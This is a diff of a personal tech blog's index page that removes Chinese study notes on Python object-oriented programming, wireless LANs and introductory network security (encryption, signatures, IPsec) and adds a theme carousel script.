-<h2 id="私有属性和私有方法"><a href="#私有属性和私有方法" class="headerlink" title="私有属性和私有方法"></a>私有属性和私有方法</h2><p>私有属性和私有方法只能在对象的内部被访问，不能在外部进行访问</p>
-<ul>
-<li>私有属性：对象不希望公开的属性</li>
-<li>私有方法：对象不希望公开的方法<br>定义方法，在属性名或方法名前加两个下划线</li>
-</ul>
-<h3 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Woman:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.__age = 18</span><br><span class="line">    def secret(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s的年龄为%d"</span> % (self.name,self.__age))   <span class="comment">#true,在对象内部的方法可以访问私有属性</span></span><br><span class="line"></span><br><span class="line">xiaofang = Woman(<span class="string">"小芳"</span>)</span><br><span class="line"><span class="built_in">print</span>(xiaofang.__age) <span class="comment"># false,在对象外部不能访问私有属性</span></span><br><span class="line">xiaofang.secret()</span><br></pre></td></tr></table></figure>
-<h3 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Woman:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.__age = 18</span><br><span class="line">    def __secret(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s的年龄为%d"</span> % (self.name,self.__age))</span><br><span class="line"></span><br><span class="line">xiaofang = Woman(<span class="string">"小芳"</span>)</span><br><span class="line">xiaofang.__secret() <span class="comment">#error，在对象外部不能访问私有方法</span></span><br></pre></td></tr></table></figure>
-<h4 id="伪私有属性和私有方法"><a href="#伪私有属性和私有方法" class="headerlink" title="伪私有属性和私有方法"></a>伪私有属性和私有方法</h4><p>Python中，并没有真正意义上的私有。在给属性、方法命名时，实际上是对名称做了一些特殊处理，使得外界无法访问。<br>可以使用以下方式访问私有属性和方法(在开发中不要使用这种方法访问私有属性和私有方法)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Woman:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.__age = 18</span><br><span class="line">    def __secret(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s的年龄为%d"</span> % (self.name,self.__age))</span><br><span class="line"></span><br><span class="line">xiaofang = Woman(<span class="string">"小芳"</span>)</span><br><span class="line"><span class="built_in">print</span>(xiaofang._Woman__age)</span><br><span class="line">xiaofang._Woman__secret()</span><br></pre></td></tr></table></figure>
-
-<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class 类名(父类名):</span><br><span class="line">     pass</span><br></pre></td></tr></table></figure>
-<h3 id="继承的传递性"><a href="#继承的传递性" class="headerlink" title="继承的传递性"></a>继承的传递性</h3><p>如果B类继承A类，C类继承B类，则C类也继承自A类。子类可以访问父类的公共属性和方法。</p>
-<h3 id="重用"><a href="#重用" class="headerlink" title="重用"></a>重用</h3><p>在子类中重写父类的同名方法，使用子类对象调用方法时，会调用子类中重写的方法。</p>
-<h4 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h4><p>子类方法完全不同于父类的同名方法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def bark(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"汪汪汪"</span>)</span><br><span class="line"></span><br><span class="line">class Xiaotianquan(Dog):</span><br><span class="line">    def bark(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"可以说话"</span>)</span><br><span class="line"></span><br><span class="line">xiaotian = Xiaotianquan()</span><br><span class="line">xiaotian.bark()    </span><br><span class="line"><span class="comment">#输出结果 ： 可以说话</span></span><br></pre></td></tr></table></figure>
-<h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>子类方法在父类同名方法的基础上再加上额外的属性。使用super().创建一个新的对象调用父类中封装的方法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line">    def bark(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"汪汪汪"</span>)</span><br><span class="line"></span><br><span class="line">class Xiaotianquan(Dog):</span><br><span class="line">    def bark(self):</span><br><span class="line">        <span class="comment">#1.针对子类的特殊需求，编写代码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"可以说话"</span>)</span><br><span class="line">        <span class="comment">#2. 使用super().调用原本在父类中封装的方法</span></span><br><span class="line">        super().bark()</span><br><span class="line">        <span class="comment">#3. 增加其他子类的方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"asdsadddd"</span>)</span><br><span class="line"></span><br><span class="line">xiaotian = Xiaotianquan()</span><br><span class="line">xiaotian.bark()</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">可以说话</span><br><span class="line">汪汪汪</span><br><span class="line">asdsadddd</span><br></pre></td></tr></table></figure>
-
-<h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><p>一个子类可以继承多个父类，并且拥有所有父类的属性和方法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class 类名(父类名1，父类名2....):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
-<p>如果在多个父类中具有同名的方法或属性，应避免使用多继承。</p>
-<h4 id="MRO方法顺序"><a href="#MRO方法顺序" class="headerlink" title="MRO方法顺序"></a>MRO方法顺序</h4><p>在多继承中可以使用类的内置属性<strong>mro</strong>查看方法的调用顺序</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class A:</span><br><span class="line">    pass</span><br><span class="line">class B:</span><br><span class="line">    pass</span><br><span class="line">class C:</span><br><span class="line">    pass</span><br><span class="line">class D(C,B,A):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(D.__mro__)</span><br><span class="line"><span class="comment">#输出结果 </span></span><br><span class="line">(&lt;class <span class="string">'__main__.D'</span>&gt;, &lt;class <span class="string">'__main__.C'</span>&gt;, &lt;class <span class="string">'__main__.B'</span>&gt;, &lt;class <span class="string">'__main__.A'</span>&gt;, &lt;class <span class="string">'object'</span>&gt;)  <span class="comment">#结果中显示的顺序即对方法和属性查找的顺序</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：Object类是所有类的基类</p>
-</blockquote>
-<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>不同的子类对象调用相同的父类方法，产生不同的执行结果</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name = name</span><br><span class="line">    def game(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s正在玩耍"</span> %(self.name))</span><br><span class="line"></span><br><span class="line">class Xiaotianquan(Dog):</span><br><span class="line">    def game(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s正在巡查公务"</span> % (self.name))</span><br><span class="line"></span><br><span class="line">class Person:</span><br><span class="line">    def __init__(self,personName):</span><br><span class="line">        self.personName = personName</span><br><span class="line">    def playWith(self,dog):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s与%s正在玩耍"</span> % (self.personName,dog.name))</span><br><span class="line">        dog.game() <span class="comment">#传递不同的对象产生不同的结果</span></span><br><span class="line"></span><br><span class="line">person = Person(<span class="string">"小明"</span>)</span><br><span class="line">dog = Dog(<span class="string">"旺财"</span>)</span><br><span class="line">person.playWith(dog)  </span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">小明与旺财正在玩耍</span><br><span class="line">旺财正在玩耍</span><br><span class="line"></span><br><span class="line">xiao = Xiaotianquan(<span class="string">"哮天犬"</span>)</span><br><span class="line">person.playWith(xiao)</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">小明与哮天犬正在玩耍</span><br><span class="line">哮天犬正在巡查公务</span><br></pre></td></tr></table></figure>
-
-<h2 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h2><p>在Python中，类也是一个对象，由类创建的对象叫做实例对象</p>
-<h3 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h3><p>类属性就是给类对象定义的属性，通常用来记录这个类相关的特征</p>
-<p>一个工具类，需要统计所有该类创建的实例对象的数量</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Tool(object):</span><br><span class="line">    count = 0</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="comment"># 让类属性加1</span></span><br><span class="line">        Tool.count+=1</span><br><span class="line"></span><br><span class="line">tool1 = Tool(<span class="string">"斧头"</span>)</span><br><span class="line">tool2 = Tool(<span class="string">"铲子"</span>)</span><br><span class="line"><span class="built_in">print</span>(Tool.count)  <span class="comment"># 输出结果 ：2</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><p>针对类对象定义的方法,语法如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@classmethod   <span class="comment">#告诉解释器这是一个类方法</span></span><br><span class="line">def 类方法名(cls): <span class="comment">#第一个参数必须是cls</span></span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
-
-<p>实例：使用一个类方法打印输出创建的工具个数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Tool(object):</span><br><span class="line">    count = 0</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="comment"># 让类属性加1</span></span><br><span class="line">        Tool.count+=1</span><br><span class="line">    @classmethod</span><br><span class="line">    def showToolCount(cls):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"已经创立了%d个工具"</span> % (cls.count))</span><br><span class="line"></span><br><span class="line">tool1 = Tool(<span class="string">"斧头"</span>)</span><br><span class="line">tool2 = Tool(<span class="string">"铲子"</span>)</span><br><span class="line"><span class="comment">#类方法只能通过类名调用，cls不需要传递，解释器会自动传递</span></span><br><span class="line">Tool.showToolCount()  <span class="comment">#输出结果：已经创立了2个工具</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>如果一个方法同时满足以下两个条件：</p>
-<ul>
-<li>不需要访问实例属性或调用实例方法</li>
-<li>不需要访问类属性或调用类方法<br>那么该方法可以封装成一个静态方法，语法如下：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@staticmethod</span><br><span class="line">def 静态方法名():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
-调用方式与类方法调用方法相同，都不需要创建对象</li>
-</ul>
-<h3 id="方法分类："><a href="#方法分类：" class="headerlink" title="方法分类："></a>方法分类：</h3><ul>
-<li>实例方法：在方法内部需要访问实例属性(实例方法内部可以使用类名访问类属性)</li>
-<li>类方法：方法内部只需要访问类属性</li>
-<li>静态方法：方法内部，不需要访问实例属性和类属性</li>
-</ul>
-
-      
+</div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/12/05/Python6/" data-id="ck5ewyozm0012i8twhguv15o4" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OOP/" rel="tag">OOP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>
 
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-network3" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/12/01/network3/" class="article-date">
-  <time datetime="2019-12-01T13:21:55.000Z" itemprop="datePublished">2019-12-01</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
-  </div>
+</div>
 
-  </div>
-  <div class="article-inner">
+<script>
+$(function () {
+    let coverSlider = $('.carousel');
+    coverSlider.carousel({
+        duration: Number('120'),
+        fullWidth: true,
+        indicators: 'true' === 'true'
+    });
+
+    let carouselIntervalId;
     
+    // Loop to call the next cover article picture.
+    let autoCarousel = function() {
+        carouselIntervalId = setInterval(function () {
+            coverSlider.carousel('next');
+        }, 5000);
+    };
+    autoCarousel();
     
-      <header class="article-header">
+
+    let restartPlay = function () {
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/01/network3/">无线网络</a>
-    </h1>
-  
+        clearInterval(carouselIntervalId);
+        autoCarousel();
+        
+    };
 
-      </header>
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h2><h3 id="无线局域网的组成"><a href="#无线局域网的组成" class="headerlink" title="无线局域网的组成"></a>无线局域网的组成</h3><p><img src="" alt=""></p>
-<ul>
-<li>一个基本服务集BSS包括一个基站和若干个移动站，所有站在本BSS以内的设备都可以直接通信，但在和本BSS以外的站通信时，都要通过本BSS的基站。</li>
-<li>基本服务集内的基站叫做接入点AP(Access Point)，其作用与网桥相似。</li>
-<li>当网络管理员安装AP时，必须为该AP分配一个不超过32字节的服务集标识符SSID和一个信道。</li>
-<li>一个基本服务集可以是孤立的，也可以通过接入点AP连接到一个主干分配系统DS(Distribution System),然后再接入到另一个基本服务集，构成扩展的服务集ESS(Extended Service Set)</li>
-<li>ESS还可以通过门户(portal)为无线用户提供到非801.11无线局域网的接入</li>
-</ul>
-<h4 id="漫游"><a href="#漫游" class="headerlink" title="漫游"></a>漫游</h4><p>移动站A从某一个基本服务集漫游到另一个基本服务集(A’)，仍可保持与另一个移动站B进行通信：<br><img src="https://i.postimg.cc/nc48dzkw/1.jpg" alt=""></p>
-<h4 id="与接入点AP建立关联"><a href="#与接入点AP建立关联" class="headerlink" title="与接入点AP建立关联"></a>与接入点AP建立关联</h4><ul>
-<li>一个移动站若要加入一个基本服务集BSS，就必须选择一个接入点AP，并与此接入点建立关联</li>
-<li>建立关联就表示这个移动站加入了选定的AP所属的子网，并和这个AP之间创建了一个虚拟线路</li>
-<li>只有关联的AP才向这个移动站发送数据帧，而这个移动站也只有通过关联的AP才能向其他站点发送数据帧</li>
-</ul>
-<h4 id="移动站与AP建立关联的方法"><a href="#移动站与AP建立关联的方法" class="headerlink" title="移动站与AP建立关联的方法"></a>移动站与AP建立关联的方法</h4><ul>
-<li>被动扫描，即移动站等待接收接入站周期性发出的信标帧(beacon frame)</li>
-<li>信标帧中包含有若干系统参数(如服务集标识符SSID以及支持的速率)</li>
-<li>主动扫描，即移动站主动发出</li>
-</ul>
+    // prev and next cover post.
+    $('#prev-cover').click(function () {
+        coverSlider.carousel('prev');
+        restartPlay();
+    });
+    $('#next-cover').click(function () {
+        coverSlider.carousel('next');
+        restartPlay();
+    });
+    
+});
+</script>
 
-      
+
+
+<main class="content">
+
+    
+    <div id="indexCard" class="index-card">
+        <div class="container ">
+            <div class="card">
+                <div class="card-content">
+                    
+                        <div class="dream">
+    
+    <div class="title center-align">
+        <i class="fa fa-lightbulb-o"></i>&nbsp;&nbsp;自我简介
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/12/01/network3/" data-id="ck5ewyp04002ri8twame9bk2a" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-network2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/12/01/network2/" class="article-date">
-  <time datetime="2019-12-01T11:01:34.000Z" itemprop="datePublished">2019-12-01</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/01/network2/">网络安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="网络安全问题概述"><a href="#网络安全问题概述" class="headerlink" title="网络安全问题概述"></a>网络安全问题概述</h2><p>计算机网络上的通信面临以下四种威胁：</p>
-<ul>
-<li>截获：从网络上窃听他人的通信内容</li>
-<li>中断：有意中断他人在网络上的通信</li>
-<li>篡改：故意篡改网络上传送的报文</li>
-<li>伪造：伪造信息在网络上传送</li>
-</ul>
-<h3 id="对攻击的分类"><a href="#对攻击的分类" class="headerlink" title="对攻击的分类"></a>对攻击的分类</h3><p>截获信息的攻击称为被动攻击，而更改信息和拒绝用户使用资源属于主动攻击</p>
-<ul>
-<li>在被动攻击中，攻击者只是观察和分析某一个协议数据单元PDU而不干扰信息流</li>
-<li>主动攻击是指攻击者对某个连接中通过的PDU进行各种处理(更改报文流、拒绝报文服务、伪造连接初始化)</li>
-</ul>
-<h3 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h3><ul>
-<li>计算机病毒：会传染其他程序的程序，传染是通过修改其他程序来把自身或其变种复制进去完成的</li>
-<li>计算机蠕虫：通过网络的通信功能将自身从一个结点发送到另一个结点并启动运行的程序</li>
-<li>特洛伊木马：一种程序，它执行的功能超出所声称的功能</li>
-<li>逻辑炸弹：一种当运行环境满足某种特定条件时执行其他特殊功能的程序</li>
-</ul>
-<h3 id="计算机网络安全的内容"><a href="#计算机网络安全的内容" class="headerlink" title="计算机网络安全的内容"></a>计算机网络安全的内容</h3><ul>
-<li>保密性</li>
-<li>安全协议的设计</li>
-<li>访问控制<br>一般数据加密模型如下图所示：<br><img src="https://pic1.superbed.cn/item/5de4acfb119afd7d7ec50c41.jpg" alt=""></li>
-</ul>
-<h2 id="两类密码体制"><a href="#两类密码体制" class="headerlink" title="两类密码体制"></a>两类密码体制</h2><h3 id="对称密钥密码体制"><a href="#对称密钥密码体制" class="headerlink" title="对称密钥密码体制"></a>对称密钥密码体制</h3><p>对称密钥系统：加密密钥和解密密钥是相同的密码体制</p>
-<h4 id="数据加密标准DES"><a href="#数据加密标准DES" class="headerlink" title="数据加密标准DES"></a>数据加密标准DES</h4><p>数据加密标准DES属于常规密钥密码体制，是一种分组密码</p>
-<ul>
-<li>在加密前，对整个明文进行分组，每一个组长为64位</li>
-<li>然后对每一个64位二进制数据进行加密处理，产生一组64位密文数据</li>
-<li>最后将各组密文串接起来，得出整个密文</li>
-<li>使用的密钥为64位(实际密钥长度为56位，有8位用奇偶校验)<br>DES的保密性取决于对密钥的保密，而算法是公开的。</li>
-</ul>
-<h3 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h3><p>公钥密码体制使用不同的加密密钥与解密密钥。是一种“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制</p>
-<h4 id="加密密钥和解密密钥"><a href="#加密密钥和解密密钥" class="headerlink" title="加密密钥和解密密钥"></a>加密密钥和解密密钥</h4><ul>
-<li>在公钥密码体制中，加密密钥(公钥)PK是公开信息，解密密钥(私钥)SK是需要保密的</li>
-<li>加密算法E和解密算法D也都是公开的</li>
-<li>虽然密钥SK是由公钥PK决定的，但却不能根据PK计算出SK</li>
-</ul>
-<h4 id="公钥算法的特点"><a href="#公钥算法的特点" class="headerlink" title="公钥算法的特点"></a>公钥算法的特点</h4><ul>
-<li>发送者A用B的公钥对明文加密后，接受者B用自己的私钥解密，即可恢复明文</li>
-<li>解密密钥是接收者的专用密钥，对其他所有人都保密</li>
-<li>加密密钥是公开的，但它不能用来解密</li>
-<li>不可能从公钥推导出私钥</li>
-<li>加解密算法都是公开的</li>
-</ul>
-<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名必须保证以下三点：</p>
-<ul>
-<li>报文鉴别：接收者能够核实发送者对报文的签名</li>
-<li>报文的完整性：发送者事后不能抵赖对报文的签名</li>
-<li>不可否认：接收者不能伪造对报文的签名</li>
-</ul>
-<h3 id="数字签名的实现"><a href="#数字签名的实现" class="headerlink" title="数字签名的实现"></a>数字签名的实现</h3><p><img src="https://pic3.superbed.cn/item/5de4ad2c119afd7d7ec51ce4.jpg" alt=""></p>
-<ul>
-<li>因为除了A外没有人能具有A的私钥，所以除A外没有别人能产生这个密文。因此B相信报文X是A签名发送的</li>
-<li>若A要抵赖曾经发送报文给B，B可将明文和对应的密文出示给第三者，第三者很容易用A的公钥去证实A确实发送X给B</li>
-<li>如B将报文X伪造成X1，则B不能在第三者前出示对应的密文，这样就证明了B伪造报文。</li>
-</ul>
-<p>具有保密性的数字签名：<br><img src="https://pic.superbed.cn/item/5de4ad4f119afd7d7ec5287c.jpg" alt=""></p>
-<h2 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h2><ul>
-<li>对方被动攻击的重要措施是加密，而对付主动攻击中的篡改和伪造则需要鉴别(authentication)</li>
-<li>报文鉴别使得通信的接收方能够验证所收到的报文</li>
-</ul>
-<h3 id="报文鉴别"><a href="#报文鉴别" class="headerlink" title="报文鉴别"></a>报文鉴别</h3><p>许多报文并不需要加密但却需要数字签名，以便于让报文的接收者能够鉴别报文的真伪。然而对很长的报文进行数字签名会使得计算机增加很大的负担(需要进行长时间的运算)，当我们传送不需要加密的报文时，可以使用MD来鉴别报文的真伪</p>
-<h4 id="报文摘要MD-Message-Digest"><a href="#报文摘要MD-Message-Digest" class="headerlink" title="报文摘要MD(Message Digest)"></a>报文摘要MD(Message Digest)</h4><ul>
-<li>A将报文X经过报文摘要算法运算后得出很短的报文摘要H，然后用自己的私钥对H进行D运算，即进行数字签名。得出已签名的报文摘要D(H)后，并将其追加在报文X后面发送给B</li>
-<li>B收到报文后首先把已签名的D(H)和报文X分离，再做下面的两件事：</li>
-</ul>
-<ol>
-<li>用A的公钥对D(H)进行E运算，得出报文摘要H</li>
-<li>对报文X进行报文摘要运算，看是否能得出同样的报文摘要H。如一样，就能一极高的概率断定收到的报文是A产生的。否则就不是</li>
-</ol>
-<p>报文摘要算法是一种散列函数。报文摘要的实现如下图所示：<br><img src="https://pic.superbed.cn/item/5de4ad4f119afd7d7ec5287c.jpg" alt=""></p>
-<h3 id="实体鉴别"><a href="#实体鉴别" class="headerlink" title="实体鉴别"></a>实体鉴别</h3><p>报文鉴别是对每个收到的报文都要鉴别报文的发送者，而实体鉴别是在系统接入的全部持续时间内对和自己通信的对方实体只需验证一次。</p>
-<h2 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h2><p>目前常用的密钥分配方式是设立密钥分配中心KDC(Key Distribution)，通过KDC来分配密钥。</p>
-<h3 id="对称密钥"><a href="#对称密钥" class="headerlink" title="对称密钥"></a>对称密钥</h3><p>用户A和B都是KDC的登记用户，并已经在KDC的服务器上安装了各自和KDC进行通信的主密钥(master key)KA和KB。</p>
-<h3 id="公钥的分配"><a href="#公钥的分配" class="headerlink" title="公钥的分配"></a>公钥的分配</h3><p>认证中心(Certification Authority,CA)将公钥与其对应的实体(人或实体)进行绑定。</p>
-<h2 id="因特网使用的安全协议"><a href="#因特网使用的安全协议" class="headerlink" title="因特网使用的安全协议"></a>因特网使用的安全协议</h2><h3 id="网络层安全协议"><a href="#网络层安全协议" class="headerlink" title="网络层安全协议"></a>网络层安全协议</h3><h4 id="IPsec与安全关联SA"><a href="#IPsec与安全关联SA" class="headerlink" title="IPsec与安全关联SA"></a>IPsec与安全关联SA</h4><p>网络层保密是指所有在IP数据报中的数据都是加密的。IPsec中最重要的两个部分：</p>
-<ul>
-<li>鉴别首部AH(Authentication Header)：AH鉴别源点和检查数据完整性，但不能保密</li>
-<li>封装安全有效载荷ESP(Encapsulation Security Payload):ESP比AH复杂得多，它鉴别源点、检查数据完整性和提供保密。</li>
-</ul>
-<h5 id="安全关联SA-Security-Association"><a href="#安全关联SA-Security-Association" class="headerlink" title="安全关联SA(Security Association)"></a>安全关联SA(Security Association)</h5><ul>
-<li>在使用AH或ESP之前，先要从源主机到目的主机建立一条网络层的逻辑连接。此逻辑连接叫做安全关联SA。</li>
-<li>IPsec就把传统的因特网无连接的网络层转换为具有逻辑连接的层</li>
-</ul>
-<p>安全关联的特点<br>安全关联是一个单向连接，它有一个三元组唯一的确定，包括：</p>
-<ul>
-<li>安全协议(AH或ESP)的标识符</li>
-<li>此单向连接的源IP地址</li>
-<li>一个32位的连接标识符，称为安全参数索引SPI(Security Parameter Index)<br>对于每个给定的安全关联SA，每个IPsec数据报都有一个存放SPI的字段，通过此SA的所有数据报都使用相同的SPI值。</li>
-</ul>
-<h4 id="鉴别首部协议AH"><a href="#鉴别首部协议AH" class="headerlink" title="鉴别首部协议AH"></a>鉴别首部协议AH</h4><ul>
-<li>在使用鉴别首部协议AH时，把AH首部插在原数据报数据部分的前面，同时把IP首部中的协议字段置为51</li>
-<li>在传输过程中，中间的路由器都不查看AH首部，当数据报到达终点时，目的主机才处理AH字段，以鉴别源点和检查数据报的完整性。<br><img src="https://pic3.superbed.cn/item/5de4adac119afd7d7ec544be.jpg" alt=""></li>
-</ul>
-<h4 id="封装安全有效载荷ESP"><a href="#封装安全有效载荷ESP" class="headerlink" title="封装安全有效载荷ESP"></a>封装安全有效载荷ESP</h4><ul>
-<li>使用ESP时，IP数据报首部的协议字段位置为50，当IP首部检查到协议字段是50时，就知道在IP首部后面紧接着的是ESP首部，同时在原IP数据报后面增加了两个字段，即ESP尾部和ESP数据。</li>
-<li>ESP鉴别和AH中的鉴别数据是一样的，因此，用ESP封装的数据报既有鉴别源站和检查数据报完整性的功能，又能提供保密。</li>
-</ul>
-<p>在IP数据报中的ESP的各字段如下所示：<br><img src="https://pic3.superbed.cn/item/5de4adda119afd7d7ec551fe.jpg" alt=""></p>
